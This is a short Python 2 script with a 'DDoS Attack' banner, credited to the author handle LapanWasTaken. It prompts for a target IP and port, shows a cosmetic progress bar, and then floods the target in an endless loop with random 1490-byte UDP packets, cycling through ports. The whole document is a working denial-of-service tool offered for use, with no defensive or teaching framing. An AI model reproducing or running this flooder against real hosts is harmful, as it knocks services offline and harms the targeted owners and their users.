import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print (""" 
    ____  ____       _____    ___   __  __             __  
   / __ \/ __ \____ / ___/   /   | / /_/ /_____ ______/ /__
  / / / / / / / __ \\__ \   / /| |/ __/ __/ __ `/ ___/ //_/
 / /_/ / /_/ / /_/ /__/ /  / ___ / /_/ /_/ /_/ / /__/ ,<   
/_____/_____/\____/____/  /_/  |_\__/\__/\__,_/\___/_/|_|  
                           .:Created By LapanWasTaken:.                                
""")
print
print "[+] Author      : LapanWasTaken"
print "[+] github      : https://github.com/LapanWasTaken"
print "[+] Telegram    : t.me/Cendawann"
print "[~] Quote       : It is better to be hated for what you are than to be loved for what you are not."
print
ip = raw_input("masukkan IP : ")
port = input("masukkan PORT : ")

os.system("clear")
os.system("figlet Attackking")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
